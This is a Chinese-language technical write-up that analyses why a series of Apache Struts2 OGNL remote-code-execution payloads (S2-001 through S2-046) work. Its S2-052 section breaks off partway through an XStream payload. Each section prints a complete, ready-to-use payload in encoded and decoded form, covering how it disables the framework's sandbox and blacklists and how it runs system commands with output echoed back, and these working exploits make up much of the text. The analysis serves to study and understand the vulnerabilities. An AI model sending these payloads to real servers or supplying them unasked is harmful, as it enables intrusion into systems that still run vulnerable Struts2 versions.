# 前言

> 断断续续的写了这么多文章,大概用了一个半月的时间,对于payload的构成做一个分析,为什么会是这些payload.

[ONGL表达式解析文章](https://wooyun.js.org/drops/OGNL%E8%AE%BE%E8%AE%A1%E5%8F%8A%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93%E9%80%A0%E6%88%90%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html)

## S2-001

```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

> 可看到执行了多个ongl表达式,比如#a,#b,#c,#d,#e,#f,分析下这些ongl表达式具体做了什么.

> ProcessBuilder类是J2SE 1.5在java.lang中新添加的一个新类,此类用于创建操作系统进程,它提供一种启动和管理进程(也就是应用程序)的方法.

> new java.lang.String[]{"id"}是新建了一个字符串列表,然后作为参数传给ProcessBuilder对象.

> ProcessBuilder类的redirectErrorStream属性默认为false,为false时子进程的标准输出和错误输出发送给两个独立的流,这些流可以通过Process.getInputStream()和Process.getErrorStream()方法来访问.如果将值设置为true,标准错误将与标准输出合并,这使得关联错误消息和相应的输出变得更容易.在此情况下,合并的数据可从Process.getInputStream()返回的流读取,Process.getErrorStream()返回的流读取将直接到达文件尾.

> start方法是使用ProcessBuilder对象启动一个新进程.

> #a的ongl表达式做的事情就容易得出来了,首先新建了一个ProcessBuilder类对象,并新创建一个字符串列表作为参数传给ProcessBuilder类对象,然后设置ProcessBuilder类对象的redirectErrorStream属性为true,然后调用ProcessBuilder类对象的start方法启动一个新进程.

> #b是调用容器变量a也就是ProcessBuilder类对象的getInputStream()来获取上一步新进程的输入流,这个输入流是字节流.

> #c是以变量b为参数新建一个InputStreamReader对象,InputStreamReader用来把字节流转换为字符流

> #d是以变量c为参数新建一个BufferedReader对象,BufferedReader用来在字符输入流中读取文本,缓冲各个字符,从而实现字符、数组和行的高效读取

> #e是创建了一个长度为50000的数组

> #d.read(#e)是调用BufferedReader对象的read方法,把从缓冲区读取的字符串放到e这个数组内

> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")在上下文环境中获取一个com.opensymphony.xwork2.dispatcher.HttpServletResponse类对象,这个类用于处理response.

> #f.getWriter().println(new java.lang.String(#e)),首先以变量e为参数新建了一个字符串对象,然后调用HttpServletResponse对象的.getWriter().println方法输出这个字符串对象到缓冲区.getWriter()方法来获取一个JspWriter对象,JspWriter相当于一个带缓存功能的printWriter,它不是直接将数据输出到页面,而是将数据刷新到response的缓冲区后再输出.

> #f.getWriter().flush()是把缓冲区的数据输出,于是我们就能看到了命令回显内容.

> #f.getWriter().close()用来关闭这个缓冲区

> 总的来说这个payload首先把以id为参数构造一个字符串数组,然后以这个字符串数组为参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行id这个命令.然后的一系列操作就是执行的结果给回显.调用ProcessBuilder类对象的getInputStream()来获取上一步新进程的输入流.以变量b为参数新建一个InputStreamReader对象用来把字节流转换为字符流,然后以变量c为参数新建一个BufferedReader对象在字符输入流中读取文本,缓冲各个字符,从而实现字符、数组和行的高效读取.然后创建了一个长度为50000的数组,再以e为参数调用BufferedReader对象的read方法,把读取的字符串放到e这个数组内.之后在上下文环境获取一个com.opensymphony.xwork2.dispatcher.HttpServletResponse类对象,这个类用于处理response.然后以变量e为参数新建了一个字符串对象,然后调用HttpServletResponse对象的.getWriter().println方法输出这个字符串对象到缓冲区.最后调用getWriter().flush()把缓冲区的数据输出,于是就能看到了命令回显内容,并调用getWriter().close()方法来关闭这个缓冲区.

## S2-003

```java
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'whoami\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
```

unicode解码后为:

```
('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(bla)(bla)&('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('#mycmd=\'whoami\'')(bla)(bla)&('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(bla)(bla)&(A)(('#mydat=new\40java.io.DataInputStream(#myret.getInputStream())')(bla))&(B)(('#myres=new\40byte[51020]')(bla))&(C)(('#mydat.readFully(#myres)')(bla))&(D)(('#mystr=new\40java.lang.String(#myres)')(bla))&('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('#myout.getWriter().println(#mystr)')(bla))
```

> 首先要对#、@字符进行unicode编码来绕过Struts2的安全限制,然后设置xwork.MethodAccessor.denyMethodExecution属性为false来开启方法调用来绕过安全沙盒的限制.

> 然后调用java.util.Collections类中的EMPTY_SET属性对memberAccess.excludeProperties进行空赋值,完成绕过.

> 剩下的流程就是执行命令,并把结果回显出来.首先定义一个字符串对象#mycmd='whoami',然后以mycmd为参数调用java.lang.Runtime类的getRuntime().exec()方法进行执行命令,然后以执行的命令结果的输入字节流为参数新建一个java.io.DataInputStream对象,用来来获取执行命令结果的输入字节流.之后新建一个数组,然后把在输入流中读取的字符赋值给这个数组.然后以这个数组为参数新建一个字符串对象,之后调用org.apache.struts2.ServletActionContext类的getResponse()方法获取一个response对象,最后调用response对象的getWriter().println方法输出这个字符串,于是就看到了命令回显内容.

## S2-005

```java
('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(bla)(bla)&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&('%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('%5Cu0023mycmd%5Cu003d%5C'id%5C'')(bla)(bla)&('%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime().exec(%5Cu0023mycmd)')(bla)(bla)&(A)(('%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream(%5Cu0023myret.getInputStream())')(bla))&(B)(('%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D')(bla))&(C)(('%5Cu0023mydat.readFully(%5Cu0023myres)')(bla))&(D)(('%5Cu0023mystr%5Cu003dnew%5C40java.lang.String(%5Cu0023myres)')(bla))&('%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('%5Cu0023myout.getWriter().println(%5Cu0023mystr)')(bla))
```

```java
?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29
```

> 第二种payload是对第一种payload的url编码.S2-003漏洞补丁中的安全配置(禁止静态方法allowStaticMethodAcces、MethodAccessor.denyMethodExecution调用和类方法执行等)被绕过再次导致了S2-005漏洞.利用OGNL先把沙盒关闭掉,xwork.MethodAccessor.denyMethodExecution设置为false,allowStaticMethodAccess设置为true就可以绕过沙盒机制了.

> 所以S2-005的payload和S2-003的payload类似,S2-005的payload在S2-003的基础上加了一个设置_memberAccess.allowStaticMethodAccess属性为true来继续绕过沙盒限制.

> 首先要对#、@字符进行unicode编码来绕过Struts2的安全限制,然后设置xwork.MethodAccessor.denyMethodExecution属性为false和_memberAccess.allowStaticMethodAccess属性为true来开启方法调用和静态方法调用绕过安全沙盒的限制.

> 然后调用java.util.Collections类中的EMPTY_SET属性对memberAccess.excludeProperties进行空赋值,完成绕过.

> 剩下的流程就是执行命令,并把结果回显出来.首先定义一个字符串对象#mycmd='whoami',然后以mycmd为参数调用java.lang.Runtime类的getRuntime().exec()方法进行执行命令,然后以执行的命令结果的输入流为参数新建一个java.io.DataInputStream对象来获取执行命令结果的输入流,之后新建一个数组,然后把在输入流中读取的字符赋值给这个数组.然后以这个数组为参数新建一个字符串对象,之后调用org.apache.struts2.ServletActionContext类的getResponse()方法获取一个response对象,最后调用response对象的getWriter().println方法输出这个字符串,于是就能看到了命令回显内容.

## S2-007

```java
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
```

> 首先设置_memberAccess的allowStaticMethodAccess属性为true来开启允许静态方法调用,然后新建一个值为false的bool对象,然后把这个对象赋值给xwork.MethodAccessor.denyMethodExecution属性来设置xwork.MethodAccessor.denyMethodExecution属性为false来允许方法执行.然后就是输出执行的命令结果,调用
java.lang.Runtime类的getRuntime().exec方法执行whoami命令,然后获取执行结果的输入流,最后调用org.apache.commons.io.IOUtils的toString方法把输入流转换为字符串并输出.

## S2-008

```java
?debug=command&expression=%28%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28"false"%29%20%2C%23context%5B"xwork.MethodAccessor.denyMethodExecution"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29
```

url解码后:

```java
?debug=command&expression=(#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()))
```

> 这个payload url解码后和S2-007的payload基本上一致的.

> 首先设置_memberAccess的allowStaticMethodAccess属性为true来开启允许静态方法调用,然后新建一个值为false的bool对象,然后把这个对象赋值给xwork.MethodAccessor.denyMethodExecution属性来设置xwork.MethodAccessor.denyMethodExecution属性为false来允许方法执行.然后就是输出执行的命令结果,调用
java.lang.Runtime类的getRuntime().exec方法执行whoami命令,然后获取执行结果的输入流,最后调用org.apache.commons.io.IOUtils的toString方法把输入流转换为字符串并输出.

## S2-009

```java
?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
```

url解码后:

```java
?age=12313&name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]=true, #a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kxlzx.println(#d),#kxlzx.close())(meh)&z[(name)('meh')]
```

> S2-009的payload和S2-005的payload类似,在设置xwork.MethodAccessor.denyMethodExecution属性时没有直接赋值为false,而是通过新建一个值为false的bool对象来进行赋值的,也不再需要对@、#进行unicode编码.其余的就和S2-005的payload类似了.

> 剩下的流程就是执行命令,并把结果回显出来.以whoami为参数调用java.lang.Runtime类的getRuntime().exec()方法进行执行命令,然后以执行的命令结果的输入流为参数新建一个java.io.DataInputStream对象来获取执行命令结果的输入流,之后新建一个数组,然后把在输入流中读取的字符赋值给这个数组.然后以这个数组为参数新建一个字符串对象,之后调用org.apache.struts2.ServletActionContext类的getResponse()方法获取一个response对象,最后调用response对象的getWriter().println方法输出这个字符串,于是就能看到了命令回显内容.

## S2-012

```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

> payload基本上和S2-001的payload基本一样.

> payload首先把以whoami为参数构造一个字符串数组,然后以这个字符串数组为参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行whoami这个命令.然后的一系列操作就是执行的结果给回显.调用ProcessBuilder类对象的getInputStream()来获取上一步新进程的输入流.以变量b为参数新建一个InputStreamReader对象用来把字节流转换为字符流,然后以变量c为参数新建一个BufferedReader对象在字符输入流中读取文本,缓冲各个字符,从而实现字符、数组和行的高效读取.然后创建了一个长度为50000的数组,再以e为参数调用BufferedReader对象的read方法,把读取的字符串放到e这个数组内.之后在上下文环境获取一个com.opensymphony.xwork2.dispatcher.HttpServletResponse类对象,这个类用于处理response.然后以变量e为参数新建了一个字符串对象,然后调用HttpServletResponse对象的.getWriter().println方法输出这个字符串对象到缓冲区.最后调用getWriter().flush()把缓冲区的数据输出,于是就能看到了命令回显内容,并调用getWriter().close()方法来关闭这个缓冲区.

## S2-013

```java
?a=%24%7B%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D
```

url解码后:

```java
?a=${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('dbapp='+new java.lang.String(#d)),#out.close()}
```

> S2-013的payload和S2-005的payload类似,不再设置xwork.MethodAccessor.denyMethodExecution属性为false,也不再需要对@、#进行unicode编码.其余的就和S2-005的payload类似了.

> 首先设置_memberAccess.allowStaticMethodAccess属性为true来开启静态方法调用绕过安全沙盒的限制.

> 剩下的流程就是执行命令,并把结果回显出来.首先以id为参数调用java.lang.Runtime类的getRuntime().exec()方法进行执行命令,然后以执行的命令结果的输入流为参数新建一个java.io.DataInputStream对象来获取执行命令结果的输入流,之后新建一个数组,然后把在输入流中读取的字符赋值给这个数组.然后以这个数组为参数新建一个字符串对象,之后调用org.apache.struts2.ServletActionContext类的getResponse()方法获取一个response对象,最后调用response对象的getWriter().println方法输出这个字符串,于是就能看到了命令回显内容.

## S2-015

```java
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(%27allowStaticMethodAccess%27)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream())%2C%23q%7D.action
```

url解码后的结果:

```java
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()),#q}.action
```

> 这个payload仍然还是先设置xwork.MethodAccessor.denyMethodExecution属性为false,设置_memberAccess的allowStaticMethodAccess属性时委婉了些,不能再直接修改.通过反射将allowStaticMethodAccess的值改变,先调用_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),然后设置这个属性为true,然后再设置_memberAccess属性为true.后面执行执行命令并输出结果的流程就和S2-007一样了.调用
java.lang.Runtime类的getRuntime().exec方法执行whoami命令,然后获取执行结果的输入流,最后调用org.apache.commons.io.IOUtils的toString方法把输入流转换为字符串并输出.

## S2-016

```java
?redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B%22id%22%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D
```

url解码后:

```java
?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[] {"id"})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader (#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt= #context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println (#e),#matt.getWriter().flush(),#matt.getWriter().close()}
```

> 把payload 进行url解码后会发现基本上和S2-001的payload基本一样.

> payload首先把以id为参数构造一个字符串数组,然后以这个字符串数组为参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行id这个命令.然后的一系列操作就是执行的结果给回显.调用ProcessBuilder类对象的getInputStream()来获取上一步新进程的输入流.以变量b为参数新建一个InputStreamReader对象用来把字节流转换为字符流,然后以变量c为参数新建一个BufferedReader对象在字符输入流中读取文本,缓冲各个字符,从而实现字符、数组和行的高效读取.然后创建了一个长度为50000的数组,再以e为参数调用BufferedReader对象的read方法,把读取的字符串放到e这个数组内.之后在上下文环境获取一个com.opensymphony.xwork2.dispatcher.HttpServletResponse类对象,这个类用于处理response.然后以变量e为参数新建了一个字符串对象,然后调用HttpServletResponse对象的.getWriter().println方法输出这个字符串对象到缓冲区.最后调用getWriter().flush()把缓冲区的数据输出,于是就能看到了命令回显内容,并调用getWriter().close()方法来关闭这个缓冲区.

## S2-032

```java
?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=whoami
```

url解码后:

```java
?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=whoami
```

> Struts2 2.3.14.2 版本之后allowStaticMethodAccess设置成final,就不能再像之前的payload直接更改allowStaticMethodAccess属性的值了.可通过DefaultMemberAccess替换SecurityMemberAccess来覆盖_memberAccess进行绕过.这样ognl计算时的规则就替换成了DefaultMemberAccess中的规则,也就没有了黑名单的限制以及静态方法的限制.这里获取类的静态属性通过ognl.OgnlRuntime#getStaticField获得,而该方法中没有调用isAccessible方法,故通过@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS来获取DefaultMemberAccess实例,赋值给上下文环境中的 _memberAccess.在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess,而这就是创建_memberAccess的过程.这两个对象的id甚至都是一样的,而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess,而其建立关系的过程就相当于继承父类并重写父类的过程.所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容,就相当于初始化了_memberAccess,这样就可以绕过其之前所设置的黑名单以及限制条件.

> 这一次的payload没有直接写成@java.lang.Runtime@getRuntime().exec('whoami')的形式,而写成了@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D)的形式,是因为在于使用method:的时候Struts2会创建一个ActionProxy来执行method后面的内容,当我们把内容放到StrutsActionProxy类的构造函数中去创建代理对象的时候会对我们传进来的表达式做一次编码,导致最后进入ognl.getValue中的表达式变成了@java.lang.Runtime@getRuntime().exec(\'whoami\'),从而导致了ognl表达式的报错.由于request中所有的参数都会放在context中,所以可以通过#parameters.参数名[0]的方式获取要执行的命令.

> payload中有,1?#xx:#request.toString这个奇怪的字符串,是因为在DefaultActionInvocation类中传给ognl.getValue之前,代码会给我们传过来的表达式后面加一个括号,所以需要payload写成,1的形式只是为了去构成一个形如1()的函数形式来防止ognl表达式报错.

> payload首先重写了_memberAccess,然后调用org.apache.struts2.ServletActionContext类的getResponse方法来获取一个response对象.根据传入的参数encoding=UTF-8来设置response对象的编码,然后调用response对象的getWriter()方法来获取一个JspWriter对象w,JspWriter相当于一个带缓存功能的printWriter,它不是直接将数据输出到页面,而是将数据刷新到response的缓冲区后再输出.之后以传入的参数cmd的值为参数调用java.lang.Runtime类的getRuntime().exec执行命令,并获取执行命令的字节流.然后以执行命令结果的字节流为参数新建一个java.util.Scanner类的对象,用来获取输入.由于Scanner对象将首先跳过输入流开头的所有空白分隔符,然后对输入流中的信息进行检查,直到遇到空白分隔符为止.所以为了获取完整的执行结果,需要重新设置输出字符串的分隔符,所以以传入的pp参数的值为参数调用Scanner对象的useDelimiter方法来指定输出字符串的分隔符.接下来是一个三元表达式,如果s.hasNext()有输入则把对象的s输入赋值给str,否则把传入参数ppp的值赋值给s,如果存在漏洞的话是把对象的s输入赋值给str.然后调用对象w的print输出str的值,然后关闭对象w.

## S2-045

```java
%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

> 可以看到payload中连接每个表达式的不再是','而变成了'.',是因为S2-029的补丁把ATSSequence树给禁了,而用','连接生成的AST树都是ATSSequence树,之所以使用'.'就是为了绕过S2-029的补丁.

> Struts2 2.3.30(2.5.2)之后的版本,之前payload使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了,覆盖的方法就不行了.S2-045的payload提供了一种新的方法.通过container获取了OgnlUtil实例,再使用clear方法清空excludedClasses、excludedPackageNames,然后再调用setMemberAccess方法设置默认的memberAccess来覆盖_memberAccess.

> payload首先定义#fuck='multipart/form-data'是为了满足漏洞的触发条件,详情可见S2-045的漏洞分析文章.然后调用ognl.OgnlContext的DEFAULT_MEMBER_ACCESS来获取DefaultMemberAccess实例.然后利用一个三元表达式,可看到#_memberAccess初始为空所以执行:后面的内容.:后面的内容首先获取一个container的实例,然后调用这个实例的getExcludedPackageNames和getExcludedClasses的clear方法来清空黑名单,然后再设置setMemberAccess为DefaultMemberAccess实例.之后定义要执行的命令字符串,然后调用java.lang.System的getProperty方来判断操作系统类型,如果是windows操作系统,调用cmd.exe /c 来执行命令,如果不是windows系统,则使用/bin/bash -c 执行命令,接下里的输出执行命令结果的流程就和S2-001的输出命令执行结果的流程类似了.以这个#cmds参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行命令.之后在获取一个org.apache.struts2.ServletActionContext类的getResponse对象来获取输出流,用于处理response.然后以这个getResponse对象和#process为参数调用org.apache.commons.io.IOUtils的copy方法把执行命令的结果发送到缓冲区,最后输出缓冲区的内容.

## S2-046

```java
-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="foo"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}b"
Content-Type: text/plain

x
-----------------------------735323031399963166993862150--
```

> 这个漏洞和S2-045的漏洞原理是一样的,只不过是触发位置不一样,S2-045触发点是Content-Type的值,S2-046触发点在Content-Disposition中的文件名值,payload的原理也是一样的.

> 可以看到payload中连接每个表达式的不再是','而变成了'.',是因为S2-029的补丁把ATSSequence树给禁了,而用','连接生成的AST树都是ATSSequence树,之所以使用'.'就是为了绕过S2-029的补丁.

> Struts2 2.3.30(2.5.2)之后的版本,之前payload使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了,覆盖的方法看似就不行了.S2-045的payload提供了一种新的方法.通过container获取了OgnlUtil实例,再使用 clear方法清空excludedClasses、excludedPackageNames,然后setMemberAccess方法设置默认的memberAccess来覆盖_memberAccess.

> payload首先定义#fuck='multipart/form-data'是为了满足漏洞的触发条件,详情可见S2-045的漏洞分析文章.然后调用ognl.OgnlContext的DEFAULT_MEMBER_ACCESS来获取DefaultMemberAccess实例.然后利用一个三元表达式,可看到#_memberAccess初始为空所以执行:后面的内容.:后面的内容首先获取一个container的实例,然后调用这个实例的getExcludedPackageNames和getExcludedClasses的clear方法来清空黑名单,然后再设置setMemberAccess为DefaultMemberAccess实例.之后定义要执行的命令字符串,之后调用java.lang.System的getProperty方来判断操作系统类型,如果是windows操作系统,调用cmd.exe /c 来执行命令,如果不是windows系统,则使用/bin/bash -c 执行命令,接下里的输出执行命令结果的流程就和S2-001的输出命令执行结果的流程类似了.以这个#cmds参数构造了一个ProcessBuilder对象,然后设置ProcessBuilder对象的redirectErrorStream属性为true,然后调用start方法新建一个进程执行命令.之后在获取一个org.apache.struts2.ServletActionContext类的getResponse对象来获取输出流,用于处理response.然后以这个getResponse对象和#process为参数调用org.apache.commons.io.IOUtils的copy方法把执行命令的结果发送到缓冲区,最后输出缓冲区的内容.

## S2-052

```java
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
        <flags>0</flags>
        <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
            <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
